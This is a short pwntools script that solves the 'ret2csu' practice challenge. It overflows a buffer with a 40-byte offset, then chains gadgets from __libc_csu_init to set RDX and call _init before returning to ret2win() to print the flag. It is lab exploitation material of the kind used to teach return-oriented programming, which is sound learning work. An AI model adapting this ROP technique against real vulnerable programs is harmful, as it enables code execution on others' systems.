from pwn import *
import sys

# ROP to 0x40089a pop gadget and setup rop to set RDX and R12 call in CSU then bypass cmp and end with ret to ret2win.

p = process("./ret2csu") # Open process
p.recvuntil("> ") # Receive banner

POP_RBX_TO_R15 = 0x40089a # pop r12; pop r13; pop r14; pop r15; ret; 
CSU_SET_RDX_CALL = 0x400880 # 0x400880 mov rdx,r15
RET2WIN = 0x4007b1 # ret2win() address
_INIT = 0x600e38 # Pointer to _init

buf = ""
buf += "A"*40 # Offset
buf += p64(POP_RBX_TO_R15) # Setup stack for call in CSU
buf += p64(0x0) # RBX
buf += p64(0x1) # RBP
buf += p64(_INIT) # R12
buf += p64(0x0) # R13
buf += p64(0x0) # R14
buf += p64(0xdeadcafebabebeef) # R15
buf += p64(CSU_SET_RDX_CALL) # Set RDX and Call R12 (_init) to bypass call instruction
buf += p64(0x0) # Padding for add rsp,0x8
buf += p64(0x0) # RBX
buf += p64(0x0) # RBP
buf += p64(0x0) # R12
buf += p64(0x0) # R13
buf += p64(0x0) # R14
buf += p64(0x0) # R15
buf += p64(RET2WIN) # Return to ret2win()
buf += p64(0xdeadbeef) # End of ROP chain marker :D

p.send(buf) # Send buffer
sys.stdout.write(p.recvall()) # Recieve flag :D
